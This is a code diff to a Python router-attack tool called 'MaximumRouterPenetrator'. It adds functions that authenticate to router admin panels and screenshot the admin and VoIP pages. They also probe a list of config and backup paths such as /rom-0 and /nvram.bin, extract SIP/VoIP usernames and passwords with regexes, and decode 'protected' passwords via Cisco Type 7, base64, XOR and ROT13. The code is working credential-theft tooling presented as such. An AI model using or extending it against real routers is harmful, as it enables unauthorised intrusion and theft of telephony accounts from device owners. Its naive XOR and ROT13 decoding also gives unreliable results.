@@ -1002,15 +1002,72 @@ class MaximumRouterPenetrator:
             result['successful_credential'] = auth_result['credentials']
             result['access_method'] = 'verified_credentials'
             
+            # Take screenshot of admin panel
+            if self.screenshot_mode and auth_result.get('session'):
+                try:
+                    if verbose:
+                        print(f"         📸 LIVE DEBUG: Taking admin panel screenshot...")
+                    screenshot_result = self._take_screenshot(
+                        auth_result['session'], 
+                        f"http://{target_ip}/admin/", 
+                        f"admin_panel_{target_ip}.png",
+                        verbose
+                    )
+                    if screenshot_result['success']:
+                        result['admin_screenshot'] = screenshot_result['filename']
+                        if verbose:
+                            print(f"         ✅ Admin panel screenshot saved: {screenshot_result['filename']}")
+                except Exception as e:
+                    if verbose:
+                        print(f"         ❌ Screenshot error: {str(e)[:50]}")
+            
             # Extract SIP with verified access (original method)
             sip_result = self._extract_sip_with_verified_access(target_ip, auth_result, verbose)
             if sip_result['verified']:
                 result['verified_sip'] = True
                 result['sip_accounts'] = sip_result['accounts']
+                
+                # Take screenshot of VoIP/SIP page
+                if self.screenshot_mode and auth_result.get('session'):
+                    try:
+                        if verbose:
+                            print(f"         📸 LIVE DEBUG: Taking VoIP/SIP page screenshot...")
+                        voip_screenshot = self._take_screenshot(
+                            auth_result['session'], 
+                            f"http://{target_ip}/voip.html", 
+                            f"voip_page_{target_ip}.png",
+                            verbose
+                        )
+                        if voip_screenshot['success']:
+                            result['voip_screenshot'] = voip_screenshot['filename']
+                            if verbose:
+                                print(f"         ✅ VoIP page screenshot saved: {voip_screenshot['filename']}")
+                    except Exception as e:
+                        if verbose:
+                            print(f"         ❌ VoIP screenshot error: {str(e)[:50]}")
             
             # NEW: Enhanced authenticated SIP extraction with multiple methods
             if verbose:
                 print(f"         🔐 LIVE DEBUG: Starting comprehensive SIP extraction...")
+            
+            # Search for config files and extract SIP
+            config_result = self._search_and_extract_config_files(target_ip, auth_result, verbose)
+            if config_result['success']:
+                result['config_files_found'] = config_result['files']
+                result['sip_from_config'] = config_result['sip_data']
+                if verbose:
+                    print(f"         ✅ Config files found: {len(config_result['files'])}")
+                    print(f"         📞 SIP data from config: {len(config_result['sip_data'])} accounts")
+                
+                # Crack protected SIP passwords
+                if config_result['sip_data']:
+                    cracked_passwords = self._crack_protected_sip_passwords(config_result['sip_data'], verbose)
+                    if cracked_passwords:
+                        result['cracked_sip_passwords'] = cracked_passwords
+                        if verbose:
+                            print(f"         🔓 SIP passwords cracked: {len(cracked_passwords)}")
+                            for cracked in cracked_passwords:
+                                print(f"         🔓 {cracked['field']}: {cracked['original']} -> {cracked['decrypted']} ({cracked['method']})")
             
             total_sip_found = 0
             
@@ -3143,6 +3200,194 @@ class MaximumRouterPenetrator:
                 continue
         
         return {'success': False}
+    
+    def _search_and_extract_config_files(self, ip: str, auth_result: Dict, verbose: bool) -> Dict[str, Any]:
+        """Search for config files and extract SIP data"""
+        config_result = {
+            'success': False,
+            'files': [],
+            'sip_data': []
+        }
+        
+        try:
+            if verbose:
+                print(f"         🔍 LIVE DEBUG: Searching for config files...")
+            
+            # Common config file paths
+            config_paths = [
+                '/config.xml', '/backup.conf', '/router.cfg', '/settings.xml',
+                '/admin/config.xml', '/cgi-bin/config.exp', '/cgi-bin/backup.cgi',
+                '/admin/backup.asp', '/maintenance/backup.asp', '/tools_admin.asp',
+                '/cgi-bin/export.cgi', '/admin/export.asp', '/config.bin',
+                '/nvram.bin', '/rom-0', '/mtd0', '/mtd1', '/mtd2'
+            ]
+            
+            base_url = f"http://{ip}"
+            credentials = auth_result.get('credentials', ('admin', 'admin'))
+            
+            # Use urllib with Basic Auth for config file access
+            import base64
+            auth_string = f'{credentials[0]}:{credentials[1]}'
+            auth_bytes = auth_string.encode('ascii')
+            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+            
+            for config_path in config_paths:
+                try:
+                    req = urllib.request.Request(f"{base_url}{config_path}")
+                    req.add_header('Authorization', f'Basic {auth_b64}')
+                    
+                    response = urllib.request.urlopen(req, timeout=self.performance_config['timeouts']['connection'])
+                    content = response.read().decode('utf-8', errors='ignore')
+                    
+                    if response.getcode() == 200 and len(content) > 100:
+                        config_result['files'].append({
+                            'path': config_path,
+                            'size': len(content),
+                            'content': content[:5000]  # First 5000 chars
+                        })
+                        
+                        # Extract SIP data from config
+                        sip_data = self._extract_sip_from_config_content(content)
+                        if sip_data:
+                            config_result['sip_data'].extend(sip_data)
+                            if verbose:
+                                print(f"         📞 SIP data found in {config_path}: {len(sip_data)} accounts")
+                        
+                        if verbose:
+                            print(f"         ✅ Config file found: {config_path} ({len(content)} bytes)")
+                
+                except Exception:
+                    continue
+            
+            if config_result['files']:
+                config_result['success'] = True
+                if verbose:
+                    print(f"         ✅ Total config files found: {len(config_result['files'])}")
+                    print(f"         📞 Total SIP accounts from config: {len(config_result['sip_data'])}")
+            
+        except Exception as e:
+            if verbose:
+                print(f"         ❌ Config search error: {str(e)[:50]}")
+        
+        return config_result
+    
+    def _extract_sip_from_config_content(self, content: str) -> List[Dict[str, str]]:
+        """Extract SIP data from config file content"""
+        sip_accounts = []
+        
+        try:
+            # Common SIP patterns in config files
+            sip_patterns = [
+                r'sip_username["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'sip_password["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'sip_server["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'sip_port["\s]*[:=]["\s]*([0-9]+)',
+                r'voip_username["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'voip_password["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'voip_server["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'phone_number["\s]*[:=]["\s]*([^"\s\n]+)',
+                r'extension["\s]*[:=]["\s]*([^"\s\n]+)'
+            ]
+            
+            import re
+            for pattern in sip_patterns:
+                matches = re.findall(pattern, content, re.IGNORECASE)
+                for match in matches:
+                    if match and len(match) > 2:
+                        sip_accounts.append({
+                            'field': pattern.split('[')[0],
+                            'value': match,
+                            'source': 'config_file'
+                        })
+        
+        except Exception:
+            pass
+        
+        return sip_accounts
+    
+    def _crack_protected_sip_passwords(self, sip_data: List[Dict], verbose: bool) -> List[Dict]:
+        """Crack protected SIP passwords and bypass security mechanisms"""
+        cracked_passwords = []
+        
+        try:
+            if verbose:
+                print(f"         🔓 LIVE DEBUG: Attempting to crack protected SIP passwords...")
+            
+            for sip_account in sip_data:
+                password = sip_account.get('value', '')
+                field = sip_account.get('field', '')
+                
+                if not password or len(password) < 3:
+                    continue
+                
+                # Try different decryption methods
+                decrypted = None
+                method = None
+                
+                # Method 1: Cisco Type 7 decryption
+                if self._is_cisco_type7(password):
+                    decrypted = self._decrypt_cisco_type7(password)
+                    method = 'cisco_type7'
+                
+                # Method 2: Base64 decoding
+                elif self._is_base64_encoded(password):
+                    try:
+                        import base64
+                        decrypted = base64.b64decode(password).decode('utf-8', errors='ignore')
+                        method = 'base64'
+                    except:
+                        pass
+                
+                # Method 3: Simple XOR (common in routers)
+                elif len(password) > 4:
+                    try:
+                        decrypted = self._simple_xor_decrypt(password)
+                        method = 'xor'
+                    except:
+                        pass
+                
+                # Method 4: ROT13
+                try:
+                    import codecs
+                    rot13_decrypted = codecs.decode(password, 'rot13')
+                    if rot13_decrypted != password and len(rot13_decrypted) > 2:
+                        decrypted = rot13_decrypted
+                        method = 'rot13'
+                except:
+                    pass
+                
+                if decrypted and decrypted != password:
+                    cracked_passwords.append({
+                        'original': password,
+                        'decrypted': decrypted,
+                        'method': method,
+                        'field': field,
+                        'security_bypassed': True
+                    })
+                    
+                    if verbose:
+                        print(f"         🔓 Password cracked: {field} = {password} -> {decrypted} ({method})")
+        
+        except Exception as e:
+            if verbose:
+                print(f"         ❌ Password cracking error: {str(e)[:50]}")
+        
+        return cracked_passwords
+    
+    def _simple_xor_decrypt(self, encrypted: str) -> str:
+        """Simple XOR decryption (common in router configs)"""
+        try:
+            # Try common XOR keys
+            keys = [0x42, 0x13, 0x37, 0x69, 0xAA, 0x55, 0xFF]
+            
+            for key in keys:
+                decrypted = ''.join(chr(ord(c) ^ key) for c in encrypted)
+                if decrypted.isprintable() and len(decrypted) > 2:
+                    return decrypted
+        except:
+            pass
+        
+        return encrypted
     
     def _verify_admin_panel_access(self, session, base_url: str, verbose: bool, content: str = None) -> bool:
         """Verify that we have actual admin panel access"""
